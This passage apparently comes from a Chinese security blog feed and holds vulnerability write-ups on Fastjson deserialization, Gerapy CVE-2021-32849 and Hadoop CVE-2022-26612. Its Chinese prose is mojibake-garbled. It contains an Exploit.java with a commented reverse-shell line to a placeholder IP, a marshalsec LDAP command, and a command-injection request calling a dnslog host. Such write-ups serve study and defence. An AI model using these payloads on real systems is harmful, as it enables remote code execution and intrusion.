function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        Spark.get(<span class="string">&quot;/&quot;</span>, (req, res) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        Spark.post(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> request.body();</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(data, <span class="keyword">new</span> <span class="title class_">Feature</span>[]&#123;Feature.SupportNonPublicField&#125;);</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">            ret.put(<span class="string">&quot;success&quot;</span>, <span class="number">200</span>);</span><br><span class="line">            ret.put(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;Hello &quot;</span> + obj.get(<span class="string">&quot;name&quot;</span>) + <span class="string">&quot;, Your age is &quot;</span> + obj.get(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">            response.status(<span class="number">200</span>);</span><br><span class="line">            response.type(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ret.toJSONString();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IndexFilter</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IndexFilter</span>();</span><br><span class="line">        i.init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè¯·æ±‚çš„æ–¹æ³•ä¸ºgetåˆ™è¿”å›hello word ï¼Œå¦‚æœä¸ºpoståˆ™å¯¹ä¼ ä¸Šæ¥çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå¹¶è¾“å‡º ä½ çš„å¹´çºªä¸å§“åè¿™é‡Œé¢æœ‰ä¸€ä¸ª<br><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</code> å‚æ•°æ˜¯ä¸ºäº†è®©è¢«privateä¿®é¥°çš„å€¼ä¹Ÿèƒ½è¢«ååºåˆ—åŒ–ã€‚<br>æˆ‘ä»¬ä¼ å…¥æ­£å¸¸çš„æ•°æ®ï¼š<br>getè¯·æ±‚ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/307874e2b5c35c8af6dfb6ddaf60ff64.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>postè¯·æ±‚ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/099df848f059bb14c7f99fcdfad49e30.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä¼ å…¥æˆ‘ä»¬æ„é€ çš„payload:</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e821001f94862210776e67cb368fc013.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ“ä½œå‰è®°å¾—å…ˆæ­å»ºå¥½ldapæœåŠ¡å™¨ï¼Œä½¿ç”¨çš„å·¥å…·æ˜¯marshalsecï¼Œå¯ä»¥åœ¨gihubä¸Šæ‰¾åˆ°ï¼Œå‘½ä»¤æ˜¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
<p>å½“é¶æœºè®¿é—®è¯¥æœåŠ¡å™¨çš„æ—¶å€™ï¼Œä¼šè¢«é‡å®šå‘åˆ°æœ¬æœºçš„80ç«¯å£ä¸Šè®¿é—®Exploit.classæ–‡ä»¶ï¼ŒExploit.javaæ–‡ä»¶ä¸­çš„å†…å®¹ä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œäº†æ‰“å¼€è®¡ç®—æœºçš„å‘½ä»¤ï¼Œä½†æˆ‘çš„æ“ä½œå¹¶æ²¡æœ‰æ‰“å¼€è®¡ç®—æœºï¼Œæ®è¯´æ˜¯åº”ä¸ºjdkç‰ˆæœ¬çš„åŸå› ã€‚è¯¦æƒ…è§ï¼š<br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a><br>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjsonååºåˆ—åŒ–æ¼æ´å¤ç°</a><br><a href="https://www.jianshu.com/p/35b84eda9292">Fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Gerapy clone åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€CVE-2021-32849ã€‘</title>
    <url>/archives/9d7d8426.html</url>
    <content><![CDATA[<p>@[TOC](Gerapy clone åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€CVE-2021-32849ã€‘)</p>
<p>è¯¥æ¼æ´çš„åˆ©ç”¨éœ€è¦æˆæƒï¼Œè™½ç„¶å±å®³è¾ƒå¤§ï¼Œä½†æ˜¯æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒé¸¡è‚‹çš„ã€‚<br>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Gerapy/Gerapy">Gerapy</a><br>è¯¥æ¼æ´å‡ºç°åœ¨é¡¹ç›®çš„<code>gerapy/server/core/views.py</code>ä¸­çš„<code>project_clone</code>å‡½æ•°ä¸­ï¼š</p>
<span id="more"></span>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api_view(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@permission_classes(<span class="params">[IsAuthenticated]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">project_clone</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    clone project from github</span></span><br><span class="line"><span class="string">    :param request: request object</span></span><br><span class="line"><span class="string">    :return: json</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = json.loads(request.body)</span><br><span class="line">        address = data.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        address = address + <span class="string">&#x27;.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> address.endswith(<span class="string">&#x27;.git&#x27;</span>) <span class="keyword">else</span> address</span><br><span class="line">        cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone cmd %s&#x27;</span>, cmd)</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone run result %s&#x27;</span>, stdout)</span><br><span class="line">        <span class="keyword">if</span> stderr: logger.error(stderr)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">True</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> stderr <span class="keyword">else</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°ç¬¬339è¡Œä½¿ç”¨äº†Popenå‡½æ•°ï¼Œæœä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¯´ç™½äº†å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆåŠŸå¼¹å‡ºæ¥äº†è®¡ç®—å™¨ã€‚<br>æ‰€ä»¥å¦‚æœcmdå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œ<br>cmdçš„èµ‹å€¼æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br></pre></td></tr></table></figure>
<p>addressæˆ–è€…targetå¯æ§å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤<br>addressçš„èµ‹å€¼æ“ä½œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§‚å¯Ÿè¿™ä¸€ä¸²ä»£ç ï¼Œé¦–å…ˆå°†è¯·æ±‚ä½“çš„æ•°æ®åŠ è½½ä¸ºpythonå­—å…¸ï¼Œç„¶åè·å–å…¶ä¸­addressé”®çš„å€¼èµ‹å€¼ç»™addressï¼ŒåŒæ—¶è¿˜è¦æ»¡è¶³addressçš„å€¼ä»¥httpå¼€å¤´ï¼Œå¦åˆ™å°±ç›´æ¥é€€å‡ºç¨‹åºäº†ã€‚æœ€åå°†addressæ‹¼æ¥.gitèµ‹å€¼ä¸ªaddressã€‚ä»è¿™ä¸ªè¿‡ç¨‹å¯ä»¥çœ‹åˆ°ï¼Œaddressçš„å€¼æ˜¯æˆ‘ä»¬å®Œå…¨å¯æ§çš„ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /api/project/clone HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 61</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;address&quot;:&quot;http://127.0.0.1;curl `id`.rwbmny.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>è®¿é—®çš„apiä¿¡æ¯åœ¨è¿™å„¿ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸å¹¸çš„æ˜¯ï¼Œè¿™ä¸ªæ“ä½œéœ€è¦è®¤è¯ï¼Œçœ‹åˆ°è¯·æ±‚å¤´ä¸­çš„Authorizationæ ‡å¤´äº†å—ï¼Œæ— è¯­å‡å™ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¡ºç€è¿™ä¸ªæ€è·¯å…¶å®è¿˜æœ‰ä¸€ç³»åˆ—çš„åˆ©ç”¨é“¾æ¡ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œä¸‹è½½æºç å®¡è®¡ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>Gerapy clone</tag>
        <tag>CVE-2021-32849</tag>
        <tag>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop ä»»æ„æ–‡ä»¶å†™å…¥ã€CVE-2022-26612ã€‘</title>
    <url>/archives/faaa9881.html</url>
    <content><![CDATA[<p>æ¥æº</p>
<blockquote>
<p><a href="https://securitylab.github.com/advisories/GHSL-2022-012_Apache_Hadoop/">https://securitylab.github.com/advisories/GHSL-2022-012_Apache_Hadoop&#x2F;</a></p>
</blockquote>
<p>è¿™ä¸ªæ´å§ï¼Œä½ ä»¥ä¸ºå¾ˆå‰å®³å§å…¶å®åœ¨æˆ‘ç›®å‰æŒæ¡çš„æƒ…å†µæ¥çœ‹å•¥ä¹Ÿä¸æ˜¯ï¼Œè¯´è¦æœ‰<code>hadoop</code>ç¯å¢ƒå§ï¼Œåæ¥å‘ç°æ ¹æœ¬ä¸éœ€è¦ï¼Œè¿˜æµªè´¹æˆ‘å¥½å¤šæ—¶é—´åœ¨<code>windows</code>ä¸Šå®‰è£…<code>hadoop</code>è¸©å‘ã€‚</p>
<span id="more"></span>
<p>å¤§æ¦‚çš„ä¸€æ˜¯å°±æ˜¯å°†<code>hadoop</code>çš„<code>FileUtil.java</code>è¿™ä¸ªç±»çš„<code>unTar</code>å‡½æ•°åœ¨è°ƒç”¨<code>unTarUsingJava</code>å‡½æ•°å¯¹<code>tar</code>åŒ…è¿›è¡Œè§£å‹çš„æ—¶å€™å¦‚æœ<code>tar</code>åŒ…ä¸­çš„æ–‡ä»¶æ˜¯ä¸ªè½¯é“¾æ¥ï¼Œé‚£ä¹ˆå°†å¯èƒ½å¯¼è‡´ç›®å½•ç©¿è¶Šä»è€Œä½¿å¾—è¿™ä¸ªè½¯é“¾æ¥é“¾æ¥åˆ°ä»»æ„çš„ä½ç½®ã€‚å½“ç„¶çœ‹åˆ°è¿™é‡Œçš„å‡½æ•°å‘½åä¸ºä½¿ç”¨<code>Java</code>è§£å‹ï¼Œé‚£ä¹ˆè‚¯å®šè¿˜æœ‰ä½¿ç”¨å‘½ä»¤è§£å‹çš„ï¼Œå½“ç„¶è¿™ä¸æ˜¯æˆ‘ä»¬çš„è®¨è®ºé‡ç‚¹ã€‚è€Œæœ€ç»ˆçš„æ ¸å¿ƒé€»è¾‘åˆ™æ˜¯åœ¨<code>unpackEntries</code>è¿™ä¸ªå‡½æ•°ä¸­,ä¸‹é¢æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹è¿™ä¸ªè¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘é¦–å…ˆå†™äº†ä¸€ä¸ªç®€å•çš„åˆ©ç”¨è„šæœ¬<br><img src="https://i-blog.csdnimg.cn/blog_migrate/80da18b8e9ee1cb6262204773d7975b4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¯«æ— ç–‘é—®ï¼Œä½ éœ€è¦ä¸€äº›ä¾èµ–<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1d99fc6fb4c9f82adfb3ac50c82ed386.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯3.2.0ï¼Œå½“ç„¶å…¶å®ç”¨ä¸äº†è¿™ä¹ˆå¤šä¾èµ–çš„ï¼Œæœ€ä¸»è¦çš„æ˜¯hdfsçš„ä¾èµ–ï¼Œæˆ‘ä¹Ÿæ‡’å¾—åˆ äº†ã€‚ç„¶åæˆ‘ä¹ˆæ¥çœ‹çœ‹æœ€æ–°çš„è¡¥ä¸é•¿å•¥æ ·<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b9690db34502a8e5d4469917b9d82c61.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾åŸå§‹çš„å­˜åœ¨æ¼æ´çš„ä»£ç ä¸ºé€”ä¸­çº¢è‰²åŒºåŸŸï¼Œè¿™æ®µä»£ç é¦–å…ˆè°ƒç”¨<code>isSymbolicLink</code>å‡½æ•°åˆ¤æ–­entryæ˜¯å¦ä¸ºç¬¦å·é“¾æ¥ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è°ƒç”¨<code>createSymbolicLink</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œè¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦åˆ›å»ºçš„ç¬¦å·é“¾æ¥çš„ä½ç½®ï¼Œç¬¬äºŒä¸ªä¸ºç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ï¼Œçœ‹çœ‹è¿™ä¸¤å‚æ•°æ€ä¹ˆèµ‹å€¼çš„ï¼Œåˆ†åˆ«ä¸º<code>FileSystems.getDefault().getPath(outputDir.getPath(), entry.getName())</code>ä¸<code>FileSystems.getDefault().getPath(entry.getLinkName())</code> è¿™é‡Œé¢æœ‰ä¸‰ä¸ªé‡ç‚¹çš„å‚æ•°ä¸€ä¸ªæ˜¯<code>outputDir.getPath</code>ä¸€ä¸ªæ˜¯<code>entry.getName</code>å¦ä¸€ä¸ªæ˜¯<code>entry.getLinkName</code>å¾ˆæ˜æ˜¾ç¬¬ä¸€ä¸ªæ˜¯è·å–<code>unTar</code>ä¼ å…¥çš„ç›®æ ‡è·¯å¾„ï¼Œç¬¬äºŒæ˜¯æ˜¯è·å–taråŒ…ä¸­è½¯é“¾æ¥æ–‡ä»¶çš„æ–‡ä»¶åï¼Œç¬¬ä¸‰ä¸ªæ˜¯è·å–è½¯é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶åã€‚è¿™ä¸‰ä¸ªå‚æ•°éƒ½æœ‰è¢«æ§åˆ¶çš„å¯èƒ½ï¼Œä¸»è¦çœ‹ç›®æ ‡ä»£ç æ€ä¹ˆå†™äº†ã€‚å½“ç„¶ç¬¬ä¸€ä¸ªå‚æ•°ä¸€èˆ¬ä¸ä¼šæœ‰ç¨‹åºå‘˜å†™çš„è®©ä½ å¯æ§çš„ï¼Œé‚£ä¹ˆèƒ½åšæ‰‹è„šçš„å°±åªå‰©ä¸‹ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°äº†ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å°†è½¯é“¾æ¥åˆ›å»ºåˆ°å¯åŠ¨ç›®å½•é‡Œé¢å»ï¼Œé‚£ä¹ˆå°±è¦æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½†æ˜¯åœ¨windowsç¯å¢ƒä¸­æ–‡ä»¶åæ˜¯ä¸èƒ½å‡ºç°/ç±»çš„ç‰¹æ®Šå­—ç¬¦çš„ï¼Œæ‰€ä»¥è¿™æ¡è·¯ä¹Ÿå°±è¢«å µæ­»äº†ã€‚é‚£ä¹ˆå°±åªèƒ½æƒ³åŠæ³•æå®šç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå½“ç„¶è¿™ä¸ªå‚æ•°æ˜¯å¯æ§çš„ã€‚æˆ‘ä»¬åªéœ€è¦åœ¨åˆ›å»ºè½¯é“¾æ¥çš„æ—¶å€™ä½¿ç”¨ç›¸å¯¹è·¯å¾„å°±å¯ä»¥äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/143d924024c0f5e634f1c0bfcf03090c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥åˆ©ç”¨çš„æ–¹å¼ä¹Ÿå°±å¾ˆæ˜æ˜¾äº†ï¼Œé¦–å…ˆæˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„æ–¹å¼åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œç„¶åä½¿ç”¨æ‰“åŒ…å·¥å…·å°†è¿™ä¸ªè½¯é“¾æ¥æ‰“åŒ…ä¸ºä¸€ä¸ªtaråŒ…ï¼Œç„¶åè°ƒç”¨FileUtil.java#unTarå‡½æ•°å¯¹è¯¥taråŒ…è¿›è¡Œè§£å‹å°±å¥½äº†ã€‚åœ¨å¯¹è½¯é“¾æ¥è¿›è¡Œæ‰“åŒ…çš„æ—¶å€™ä¸è¦ä½¿ç”¨linuxå‘½ä»¤æ‰“åŒ…ï¼Œé‡åˆ°äº†å‘ï¼Œå¯ä»¥é€‰ç”¨7zipï¼Œæ‰“åŒ…çš„æ—¶å€™æ³¨æ„é€‰æ‹©å‹ç¼©æ ¼å¼ä»¥åŠå‹¾é€‰ä¿å­˜ç¬¦å·é“¾æ¥å¤é€‰æ¡†ï¼Œä¸ç„¶æ˜¯ä¼šå¤±è´¥çš„å“¦ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/78620defd00475443302962f177fcdfd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æ‰€ä»¥çœ‹åˆ°è¿™é‡Œä½ è¿˜è§‰å¾—è¿™ä¸ªæ¼æ´å¾ˆæœ‰ç”¨å—ï¼Ÿ</p>
<p>å½“ç„¶å…·ä½“çš„è°ƒç”¨è¿‡ç¨‹ï¼Œå¯ä»¥è‡ªå·±ç”¨IDEAè°ƒè¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæ³¨æ„IDEAè¦ä½¿ç”¨ç®¡ç†å‘˜æƒé™å¯åŠ¨ï¼Œä¸ç„¶æ˜¯ä¸èƒ½åˆ›å»ºç¬¦å·é“¾æ¥çš„ã€‚<br>å½“ç„¶ï¼Œå¦‚æœä½ çš„windowsæ²¡æœ‰hadoopç¯å¢ƒï¼Œåœ¨æ‰§è¡Œæµ‹è¯•æ ·ä¾‹çš„æ—¶å€™å¯èƒ½ä¼šæŠ¥é”™ï¼Œä½†å¹¶ä¸å½±å“æœ€ç»ˆçš„ç»“æœï¼Œå¦‚æœä½ æƒ³å®Œç¾æ— ç¼ºï¼Œä½ å¿…é¡»å®‰è£…hadoopå¹¶é…ç½®ç¯å¢ƒå˜é‡</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ä»»æ„æ–‡ä»¶å†™</tag>
        <tag>hadoop</tag>
        <tag>CVE-2022-26612</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop Yarn RPC æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
    <url>/archives/fe9d893.html</url>
    <content><![CDATA[<p>@[TOC](Hadoop Yarn RPCæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°)</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/3ab30941cdeba7e45e3144e8bab166aa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/22c1f14442ae999cd5642a84e344b9b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>è¿œç¨‹ä»£ç æ‰§è¡Œ</tag>
        <tag>Hadoop</tag>
        <tag>Yarn</tag>
        <tag>RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAåŠ¨æ€ä»£ç†ä»£ç æ¢³ç†</title>
    <url>/archives/d38cd4a6.html</url>
    <content><![CDATA[<p>å½“æˆ‘ä»¬è¦ä¸ºæˆ‘ä»¬çš„ä»£ç é™„åŠ åˆ«çš„åŠŸèƒ½çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¾€å¾€å†™ä¸€ä¸ªä»£ç†ç±»æ¥å®ç°å¯¹å½“å‰ç±»çš„å°è£…ï¼Œè¯¥ä»£ç†ç±»ä¸å®ç°å…·ä½“çš„ä»£ç é€»è¾‘ï¼Œåªæ˜¯æä¾›äº†é¢å¤–çš„åŠŸèƒ½ï¼Œä½†å¦‚æœæˆ‘æœ‰å¾ˆå¤šçš„ç±»éœ€è¦å°è£…ä¸€æ ·çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘å°±å¾—å†™å¾ˆå¤šçš„ä»£ç†ç±»ï¼Œè¿™ç§æ–¹å¼è€—æ—¶ä¸¥é‡ä¸”ä¸æ˜“ç»´æŠ¤ï¼Œæ˜¯æä¸ºä¸å¯å–çš„ã€‚æ‰€ä»¥JAVAä¸ºæˆ‘ä»¬æä¾›äº†åŠ¨æ€ä»£ç†çš„æ–¹å¼æ¥ä¸€åŠ³æ°¸é€¸ï¼Œè²Œä¼¼å¤§åé¼é¼çš„AOPå°±æ˜¯é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼å®ç°çš„ï¼Œé‚£æˆ‘ä»¬æ¥å†™ä¸€ä¸ªåŠ¨æ€ä»£ç†çš„ä¾‹å­ã€‚</p>
<span id="more"></span>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¥å£ï¼Œä½œä¸ºè¢«ä»£ç†ç±»çš„æ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProxyInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå®šä¹‰ä¸€ä¸ªå®ç°ç±»</p>
